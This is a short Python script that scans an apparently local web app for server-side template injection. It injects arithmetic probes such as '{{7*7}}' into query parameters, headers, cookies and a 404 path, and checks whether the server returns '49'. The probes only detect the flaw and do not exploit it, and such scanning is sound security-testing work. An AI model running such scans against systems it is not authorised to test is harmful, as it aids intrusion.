import requests, itertools
from urllib.parse import quote
base='http://localhost:5000'

# Define payloads that would evaluate to '49' under common SSTI engines
payloads=['{{7*7}}','{{ 7*7 }}','${{7*7}}','<%=7*7%>','#{7*7}','{{7*7}}']

# Try query param variations
params_keys=['name','q','s','search','template','view','content','message','input','user','value']
res=[]
for key in params_keys:
    for p in payloads:
        try:
            r=requests.get(base+'/page', params={key:p}, timeout=5)
            if '49' in r.text and p not in r.text:
                res.append(('query', key, p, r.status_code))
        except Exception as e:
            pass

# Try headers
headers_to_try=['User-Agent','Referer','X-Forwarded-For','X-Api-Version','X-Template','X-Name']
for p in payloads:
    h={h:p for h in headers_to_try}
    try:
        r=requests.get(base+'/page?name=test', headers=h, timeout=5)
        if '49' in r.text and p not in r.text:
            res.append(('header', 'multi', p, r.status_code))
    except Exception as e:
        pass

# Try cookies
cookies={'session':quote('{{7*7}}'),'name':quote('{{7*7}}')}
try:
    r=requests.get(base+'/page?name=test', cookies=cookies, timeout=5)
    if '49' in r.text and '{{7*7}}' not in r.text:
        res.append(('cookie','name','{{7*7}}', r.status_code))
except Exception as e:
    pass

# Try encoded path with curly braces to hit 404 template
try:
    path='/' + quote('{{7*7}}')
    r=requests.get(base+path, timeout=5)
    if '49' in r.text and '{{7*7}}' not in r.text:
        res.append(('path404', path, '{{7*7}}', r.status_code))
except Exception as e:
    pass

print(res if res else 'NO_EVAL')

